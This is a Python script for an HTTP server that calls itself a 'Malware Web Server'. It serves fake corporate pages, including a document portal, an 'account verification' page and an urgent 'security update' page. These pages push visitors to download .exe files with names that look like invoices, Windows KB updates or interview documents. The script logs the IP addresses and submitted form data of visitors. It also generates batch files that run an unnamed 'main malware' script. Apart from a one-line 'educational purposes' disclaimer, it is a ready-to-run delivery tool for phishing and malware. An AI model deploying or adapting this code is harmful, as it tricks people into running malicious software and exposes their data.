#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Malware Web Server - Serves malware disguised as legitimate downloads
WARNING: This is for educational purposes only!
"""

import os
import json
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import mimetypes

class MalwareHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle GET requests"""
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        
        print(f"Request from {self.client_address[0]}: {path}")
        
        # Serve different content based on path
        if path == '/':
            self.serve_homepage()
        elif path.startswith('/download/'):
            self.serve_malware_download(path)
        elif path.startswith('/verify/'):
            self.serve_verification_page(path)
        elif path.startswith('/update/'):
            self.serve_update_page(path)
        else:
            self.serve_404()
    
    def serve_homepage(self):
        """Serve homepage"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>TechCorp Solutions</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .container { max-width: 800px; margin: 0 auto; }
                .header { background-color: #0078d4; color: white; padding: 20px; text-align: center; }
                .content { padding: 20px; }
                .download-btn { background-color: #0078d4; color: white; padding: 10px 20px; text-decoration: none; border-radius: 3px; display: inline-block; margin: 10px 0; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>TechCorp Solutions</h1>
                    <p>Secure Document Portal</p>
                </div>
                <div class="content">
                    <h2>Welcome to TechCorp Solutions</h2>
                    <p>This is a secure document portal for our clients and partners.</p>
                    <p>Please use the links provided in your email to access specific documents.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def serve_malware_download(self, path):
        """Serve malware disguised as legitimate download"""
        # Extract filename from path
        filename = path.split('/')[-1]
        
        # Create fake download page
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Download - {filename}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; }}
                .container {{ max-width: 600px; margin: 0 auto; }}
                .header {{ background-color: #0078d4; color: white; padding: 20px; text-align: center; }}
                .content {{ padding: 20px; }}
                .download-btn {{ background-color: #28a745; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 20px 0; font-size: 16px; }}
                .info {{ background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Document Download</h1>
                </div>
                <div class="content">
                    <h2>Download Ready</h2>
                    <p>Your document is ready for download.</p>
                    
                    <div class="info">
                        <strong>File:</strong> {filename}<br>
                        <strong>Size:</strong> 2.3 MB<br>
                        <strong>Type:</strong> Document<br>
                        <strong>Last Modified:</strong> {time.strftime("%Y-%m-%d %H:%M:%S")}
                    </div>
                    
                    <a href="/malware/{filename}" class="download-btn">Download Now</a>
                    
                    <p><small>If the download doesn't start automatically, click the button above.</small></p>
                </div>
            </div>
        </body>
        </html>
        """
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def serve_verification_page(self, path):
        """Serve verification page that downloads malware"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Account Verification</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .container { max-width: 600px; margin: 0 auto; }
                .header { background-color: #0078d4; color: white; padding: 20px; text-align: center; }
                .content { padding: 20px; }
                .form-group { margin: 15px 0; }
                label { display: block; margin-bottom: 5px; font-weight: bold; }
                input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 3px; }
                .btn { background-color: #28a745; color: white; padding: 12px 25px; border: none; border-radius: 3px; cursor: pointer; }
                .download-btn { background-color: #dc3545; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 20px 0; font-size: 16px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Account Verification</h1>
                </div>
                <div class="content">
                    <h2>Security Verification Required</h2>
                    <p>To complete your account verification, please download and run our security tool.</p>
                    
                    <a href="/malware/security-verification.exe" class="download-btn">Download Security Tool</a>
                    
                    <p><small>This tool will verify your account and restore access.</small></p>
                </div>
            </div>
        </body>
        </html>
        """
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def serve_update_page(self, path):
        """Serve update page that downloads malware"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Update</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .container { max-width: 600px; margin: 0 auto; }
                .header { background-color: #dc3545; color: white; padding: 20px; text-align: center; }
                .content { padding: 20px; }
                .alert { background-color: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 5px; margin: 20px 0; }
                .download-btn { background-color: #dc3545; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 20px 0; font-size: 16px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Critical Security Update</h1>
                </div>
                <div class="content">
                    <div class="alert">
                        <strong>URGENT:</strong> A critical security vulnerability has been detected in your system.
                    </div>
                    
                    <h2>Download Security Update</h2>
                    <p>Please download and install this security update immediately to protect your system.</p>
                    
                    <a href="/malware/security-update.exe" class="download-btn">Download Security Update</a>
                    
                    <p><small>This update addresses critical security vulnerabilities and system stability issues.</small></p>
                </div>
            </div>
        </body>
        </html>
        """
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def serve_404(self):
        """Serve 404 page"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Page Not Found</title>
        </head>
        <body>
            <h1>404 - Page Not Found</h1>
            <p>The requested page could not be found.</p>
        </body>
        </html>
        """
        
        self.send_response(404)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def do_POST(self):
        """Handle POST requests"""
        # Handle form submissions
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        print(f"POST request from {self.client_address[0]}: {post_data.decode()}")
        
        # Redirect to download page
        self.send_response(302)
        self.send_header('Location', '/download/verification-tool.exe')
        self.end_headers()
    
    def log_message(self, format, *args):
        """Log requests"""
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {format % args}")

def create_malware_files():
    """Create malware files to serve"""
    malware_files = [
        "project-document-2024.exe",
        "INV-2024-001.exe", 
        "interview-prep-software-developer.exe",
        "newsletter-issue-45.exe",
        "renewal-2024.exe",
        "KB5001234.exe",
        "account-verification.exe",
        "security-verification.exe",
        "security-update.exe"
    ]
    
    # Create malware directory
    os.makedirs("malware", exist_ok=True)
    
    for filename in malware_files:
        filepath = os.path.join("malware", filename)
        
        # Create a batch file that executes the malware
        batch_content = f'''@echo off
echo Installing {filename.split('.')[0]}...
echo Please wait while we configure your system...
timeout /t 3 /nobreak >nul

REM Execute the main malware
python app.py

echo Installation completed successfully!
pause
'''
        
        with open(filepath, 'w') as f:
            f.write(batch_content)
        
        print(f"✓ Created malware file: {filepath}")

def start_malware_server(port=8080):
    """Start the malware server"""
    print("="*60)
    print("MALWARE WEB SERVER")
    print("="*60)
    print("WARNING: This is for educational purposes only!")
    print("="*60)
    
    # Create malware files
    create_malware_files()
    
    # Start server
    server_address = ('', port)
    httpd = HTTPServer(server_address, MalwareHandler)
    
    print(f"🚀 Malware server started on port {port}")
    print(f"🌐 Server URL: http://localhost:{port}")
    print(f"📁 Malware files created in: malware/")
    print("="*60)
    print("Server is running... Press Ctrl+C to stop")
    print("="*60)
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Server stopped by user")
        httpd.shutdown()

if __name__ == "__main__":
    start_malware_server()
